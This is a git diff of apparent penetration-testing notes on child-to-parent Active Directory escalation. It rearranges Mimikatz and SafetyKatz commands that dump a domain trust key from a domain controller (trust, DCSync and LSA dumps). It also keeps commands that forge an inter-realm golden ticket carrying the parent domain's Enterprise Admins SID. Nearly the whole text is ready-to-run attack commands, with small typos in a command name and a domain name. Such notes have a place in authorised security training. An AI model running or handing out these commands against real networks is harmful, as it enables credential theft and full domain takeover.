@@ -20,19 +20,18 @@ Child to Parent using Trust Tickets
 
 **Export Trustkey**
 
-<pre class="language-powershell"><code class="lang-powershell">SafetyKatz on DC
-lsadump ::trust /patch'
+<pre class="language-powershell"><code class="lang-powershell">Invoke-Mimikatz -Command '"lsadump ::trust /patch'" -ComputerName dchostname
+or
+Invoke-Mimikatz -Command '"lsadump ::dcsync /user:dom\forest-dc-host$'"
+or
+Invoke-Mimikatz -Command '"lsadump ::lsa /patch'"
 
 Output:
 <strong>Domain: dom.local (dom/ S-1-5-2...) 
 </strong>[ In ] sub.dom.lcao -> dom.local
  => Take rcklist4_hmac_nt  ....
 
-Invoke-Mimikatz -Command '"lsadump ::trust /patch'" -ComputerName dchostname
-or
-Invoke-Mimikatz -Command '"lsadump ::dcsync /user:dom\forest-dc-host$'"
-or
-Invoke-Mimikatz -Command '"lsadump ::lsa /patch'"
+
 </code></pre>
 
 **Forge an inter-realm TGT**
@@ -40,7 +39,6 @@ Invoke-Mimikatz -Command '"lsadump ::lsa /patch'"
 {% code overflow="wrap" %}
 ```powershell
 C:\AD\Tools\BetterSafetyKatz.exe "kerberros::golden /user:Administrator /domain:sub.dom.local /sid:sid-of-current-domain /sids:sid-of-enterprise-admins-group-of-parent-domain /rc4:hash-of-trust-key-see-above-cmd /service:krbtgt /target:dom.local /ticket:C:\save-ticket-here.kirbi" "exit"
-
 
 
 Invoke-mimikatz -command '"kerberos::golden /user:Administrator /domain:sub.dom.local /sid:sid-of-current-domain /sids:sid-of-enterprise-admins-group-of-parent-domain /rc4:hash-of-trust--key /service:krbtgt /target:dom.local /ticket:C:\save-ticket-here.kirbi'"
